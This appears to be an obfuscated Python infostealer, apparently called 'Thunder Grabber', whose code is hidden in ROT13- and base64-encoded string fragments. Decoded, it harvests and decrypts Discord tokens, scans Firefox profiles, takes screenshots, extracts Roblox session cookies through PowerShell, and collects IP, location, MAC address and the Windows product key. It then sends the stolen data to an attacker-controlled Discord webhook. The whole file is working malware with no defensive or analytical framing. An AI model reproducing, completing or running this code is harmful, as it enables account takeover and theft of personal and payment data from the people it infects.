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'
god = 'AgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAoc2VsZi5yZWdleCk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIGZpbmRhbGwocmVnZXgsIGxpbmUpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KHNlbGYuYmFzZXVybCwgaGVhZGVycz1zZWxmLmdldGhlYWRlcnModG9rZW4pKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMCBhbmQgdG9rZW4gbm90IGluIHNlbGYudG9rZW5zOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50b2tlbnMuYXBwZW5kKHRva2VuKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhzZWxmLnJvYW1pbmcrJ1xcZGlzY29yZFxcTG9jYWwgU3RhdGUnKToNCiAgICAgICAgICAgICAgICAgICAgZm9yIGZpbGVfbmFtZSBpbiBvcy5saXN0ZGlyKHBhdGgpOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxvZycpIGFuZCBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCcubGRiJyk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBsaW5lIGluIFt4LnN0cmlwKCkgZm9yIHggaW4gb3BlbihmJ3twYXRofVxce2ZpbGVfbmFtZX0nLCBlcnJvcnM9J2lnbm9yZScpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHkgaW4gZmluZGFsbChzZWxmLmVuY3J5cHRlZF9yZWdleCwgbGluZSk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRva2VuID0gTm9uZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2tlbiA9IHNlbGYuZGVjcnlwdF9wYXNzd29yZChiYXNlNjQuYjY0ZGVjb2RlKHlbOnkuZmluZCgnIicpXS5zcGxpdCgnZFF3NHc5V2dYY1E6JylbMV0pLCBzZWxmLmdldF9tYXN0ZXJfa2V5KHNlbGYucm9hbWluZysnXFxkaXNjb3JkXFxMb2NhbCBTdGF0ZScpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldChzZWxmLmJhc2V1cmwsIGhlYWRlcnM9c2VsZi5nZXRoZWFkZXJzKHRva2VuKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDAgYW5kIHRva2VuIG5vdCBpbiBzZWxmLnRva2VuczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudG9rZW5zLmFwcGVuZCh0b2tlbikNCg0KICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhzZWxmLnJvYW1pbmcrIlxcTW96aWxsYVxcRmlyZWZveFxcUHJvZmlsZXMiKToNCiAgICAgICAgICAgIGZvciBwYXRoLCBfLCBmaWxlcyBpbiBvcy53YWxrKHNlbGYucm9hbWluZysiXFxNb3ppbGxhXFxGaXJlZm94XFxQcm9maWxlcyIpOg0KICAgICAgICAgICAgICAgIGZvciBfZmlsZSBpbiBmaWxlczoNCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IF9maWxlLmVuZHN3aXRoKCcuc3FsaXRlJyk6DQogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7cGF0aH1cXHtfZmlsZX0nLCBlcnJvcnM9J2lnbm9yZScpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06DQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgcmVnZXggaW4gKHNlbGYucmVnZXgpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiBmaW5kYWxsKHJlZ2V4LCBsaW5lKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldChzZWxmLmJhc2V1cmwsIGhlYWRlcnM9c2VsZi5nZXRoZWFkZXJzKHRva2VuKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDAgYW5kIHRva2VuIG5vdCBpbiBzZWxmLnRva2VuczoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYudG9rZW5zLmFwcGVuZCh0b2tlbikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgIGRlZiBzY3JlZW5zaG90KHNlbGYpOg0KICAgICAgICBpbWFnZSA9IEltYWdlR3JhYi5ncmFiKA0KICAgICAgICAgICAgYmJveD1Ob25lLCANCiAgICAgICAgICAgIGluY2x1ZGVfbGF5ZXJlZF93aW5kb3dzPUZhbHNlLCANCiAgICAgICAgICAgIGFsbF9zY3JlZW5zPUZhbHNlLCANCiAgICAgICAgICAgIHhkaXNwbGF5PU5vbmUNCiAgICAgICAgKQ0KICAgICAgICB0ZW1wZm9sZGVyID0gb3MuZ2V0ZW52KCJ0ZW1wIikrIlxcVGh1bmRlciINCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgb3MubWtkaXIob3MucGF0aC5qb2luKHRlbXBmb2xkZXIpKQ0KICAgICAgICBleGNlcHQgRXhjZXB0aW9uOg0KICAgICAgICAgICAgcGFzcw0KICAgICAgICBpbWFnZS5zYXZlKGYne3RlbXBmb2xkZXJ9XFxTY3JlZW5zaG90LnBuZycpDQogICAgICAgIGltYWdlLmNsb3NlKCkNCiAgICAgICAgDQogICAgZGVmIGdyYWJSb2Jsb3hDb29raWUoc2VsZik6DQogICAgICAgIHRlbXBmb2xkZXIgPSBvcy5nZXRlbnYoInRlbXAiKSsiXFxUaHVuZGVyIg0KICAgICAgICBkZWYgc3VicHJvYyhwYXRoKToNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICByZXR1cm4gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoDQogICAgICAgICAgICAgICAgICAgIGZyInBvd2Vyc2hlbGwgR2V0LUl0ZW1Qcm9wZXJ0eVZhbHVlIC1QYXRoIHtwYXRofTpTT0ZUV0FSRVxSb2Jsb3hcUm9ibG94U3R1ZGlvQnJvd3Nlclxyb2Jsb3guY29tIC1OYW1lIC5ST0JMT1NFQ1VSSVRZIiwNCiAgICAgICAgICAgICAgICAgICAgY3JlYXRpb25mbGFncz0weDA4MDAwMDAwKS5kZWNvZGUoKS5yc3RyaXAoKQ0KICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoNCiAgICAgICAgICAgICAgICByZXR1cm4gTm9uZQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICByZWdfY29va2llID0gc3VicHJvYyhyJ0hLTE0nKQ0KICAgICAgICAgICAgaWYgbm90IHJlZ19jb29raWU6DQogICAgICAgICAgICAgICAgcmVnX2Nvb2tpZSA9IHN1YnByb2MocidIS0NVJykNCiAgICAgICAgICAgIGlmIHJlZ19jb29raWU6DQogICAgICAgICAgICAgICAgc2VsZi5yb2Jsb3hjb29raWVzLmFwcGVuZChyZWdfY29va2llKQ0KICAgICAgICAgICAgaWYgc2VsZi5yb2Jsb3hjb29raWVzOg0KICAgICAgICAgICAgICAgIHdpdGggb3BlbihmInt0ZW1wZm9sZGVyfVxcUm9ibG94LnR4dCIsICJ3IikgYXMgZjY6DQogICAgICAgICAgICAgICAgICAgIGZvciBpIGluIHNlbGYucm9ibG94Y29va2llczoNCiAgICAgICAgICAgICAgICAgICAgICAgIGY2LndyaXRlKGkrJ1xuJykNCiAgICAgICAgZXhjZXB0IDoNCiAgICAgICAgICAgIHdpdGggb3BlbihmInt0ZW1wZm9sZGVyfVxcUm9ibG94LnR4dCIsICJ3IikgYXMgZjk6DQogICAgICAgICAgICAgICAgICAgICAgICBmOS53cml0ZSgiTm8gUm9ibG94IGNvb2tpZXMgZm91bmQiKQ0KICAgICAgICAgICAgICANCiAgICBkZWYgU2VuZEluZm8oc2VsZik6DQogICAgICAgIGlmIHNlbGYudG9rZW5zID09IE5vbmU6DQogICAgICAgICAgICBwYXNzDQogICAgICAgIGVsc2U6ICAgIA0KICAgICAgICAgICAgZm9yIHRva2VuIGluIHNlbGYudG9rZW5zOiAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGhlYWRlcnMgPSB7DQogICAgICAgICAgICAgICAgICAgICAgICAnQXV0aG9yaXphdGlvbic6IHRva2VuLA0KICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQoNCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92OS91c2Vycy9AbWUnLCBoZWFkZXJzPWhlYWRlcnMpDQogICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6DQogICAgICAgICAgICAgICAgICAgIHJfanNvbiA9IHIuanNvbigpDQogICAgICAgICAgICAgICAgICAgIHVzZXJfbmFtZSA9IGYne3JfanNvblsidXNlcm5hbWUiXX0je3JfanNvblsiZGlzY3JpbWluYXRvciJdfScNCiAgICAgICAgICAgICAgICAgICAgdXNlcl9pZCA9IHJfanNvblsnaWQnXQ0KICAgICAgICAgICAgICAgICAgICBhdmF0YXJfaWQgPSByX2pzb25bJ2F2YXRhciddDQogICAgICAgICAgICAgICAgICAgIGF2YXRhcl91cmwgPSBmImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMve3VzZXJfaWR9L3thdmF0YXJfaWR9Ig0KICAgICAgICAgICAgICAgICAgICBwaG9uZV9udW1iZXIgPSByX2pzb25bJ3Bob25lJ10NCiAgICAgICAgICAgICAgICAgICAgZW1haWwgPSByX2pzb25bJ2VtYWlsJ10NCiAgICAgICAgICAgICAgICAgICAgbWZhX2VuYWJsZWQgPSByX2pzb25bJ21mYV9lbmFibGVkJ10NCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIG5pdHJvX2RhdGEgPSByZXF1ZXN0cy5nZXQoc2VsZi5iYXNldXJsKycvYmlsbGluZy9zdWJzY3JpcHRpb25zJywgaGVhZGVycz1zZWxmLmdldGhlYWRlcnModG9rZW4pKS5qc29uKCkNCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOg0KICAgICAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgICAgICAgICAgaGFzX25pdHJvID0gRmFsc2UNCiAgICAgICAgICAgICAgICBoYXNfbml0cm8gPSBib29sKGxlbihuaXRyb19kYXRhKSA+IDApDQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICBiaWxsaW5nID0gYm9vbChsZW4oanNvbi5sb2FkcyhyZXF1ZXN0cy5nZXQoc2VsZi5iYXNldXJsKyIvYmlsbGluZy9wYXltZW50LXNvdXJjZXMiLCBoZWFkZXJzPXNlbGYuZ2V0aGVhZGVycyh0b2tlbikpLnRleHQpKSA+IDApDQogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoNCiAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBkYXRhID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2lwaW5mby5pby9qc29uIikuanNvbigpDQogICAgICAgICAgICAgICAgaXAgPSBkYXRhWydpcCddDQogICAgICAgICAgICAgICAgY2l0eSA9IGRhdGFbJ2NpdHknXQ0KICAgICAgICAgICAgICAgIGNvdW50cnkgPSBkYXRhWydjb3VudHJ5J10NCiAgICAgICAgICAgICAgICByZWdpb24gPSBkYXRhWydyZWdpb24nXQ0KICAgICAgICAgICAgICAgIHduYW1lID0gc2VsZi5nZXRQcm9kdWN0S2V5KClbMF0NCiAgICAgICAgICAgICAgICB3a2V5ID0gc2VsZi5nZXRQcm9kdWN0S2V5KClbMV0NCiAgICAgICAgICAgICAgICBtYWMgPSBnbWEoKQ0KICAgICAgICAgICAgICAgIGhvc3RuYW1lID0gc29ja2V0LmdldGhvc3RuYW1lKCkNCiAgICAgICAgICAgICAgICB3ZWJob29rID0gRGlzY29yZFdlYmhvb2sodXJsPXdlYmxpbmssIHVzZXJuYW1lPSJUaHVuZGVyIiwgYXZhdGFyX3VybD0iaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTYxOTUwMTM0ODE0NTM1NzAwLzk2MTk1MDIyNDg3NDYzMTIyOC9UaGlnaHMyLmpwZyIpDQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgZW1iZWQgPSBEaXNjb3JkRW1iZWQodGl0bGU9ZiLwn5KJIHt1c2VyX25hbWV9IEhhcyBCZWVuIExvZ2dlZCDwn5KJIixjb2xvcj0nNEUwMTYzJykNCiAgICAgICAgICAgICAgICBlbWJlZC5zZXRfYXV0aG9yKG5hbWU9IuKaoSBUaHVuZGVyIEdyYWJiZXIg4pqhIiwgdXJsPSdodHRwczovL2dpdGh1Yi5jb20vVFdJU1QtWDcnKQ0KICAgICAgICAgICAgICAgIGVtYmVkLmFkZF9lbWJlZF9maWVsZChuYW1lPSfwn6e+IEFjY291bnQgSW5mb3JhbXRpb24gJywgdmFsdWU9ZiIiImBgYGluaQ0KW1VzZXJuYW1lXSA6IHt1c2VyX25hbWV9XG5bVXNlciBJRF0gOiB7dXNlcl9pZH1cbltQaG9uZSBOdW1iZXJdIDoge3Bob25lX251bWJlcn1cbltFbWFpbF0gOiB7ZW1haWx9XG5bMkZBL01GQSBFbmFibGVkXSA6IHttZmFfZW5hYmxlZH1cbltOaXRybyBTdGF0dXNdIDoge2hhc19uaXRyb31cbltQYXltZW50IE1ldGhvZF0gOiB7YmlsbGluZ30gYGBgIiIiLCBpbmxpbmU9RmFsc2UpDQogICAgICAgICAgICAgICAgZW1iZWQuYWRkX2VtYmVkX2ZpZWxkKG5hbWU9J/CfkajigI3wn5K7IFVzZXIgSW5mb3JtYXRpb24nLCB2YWx1ZT1mIiIiYGBgZml4DQpbSG9zdG5hbWVdIDoge2hvc3RuYW1lfVxuW0lQIEFkcmVzc2VdIDoge2lwfVxuW01hYyBBZHJlc3NlXSA6IHttYWN9IFxuW0NpdHldIDoge2NpdHl9XG5bQ291bnRyeV0gOiB7Y291bnRyeX1cbltSZWdpb25dIDoge3JlZ2lvb'
destiny = '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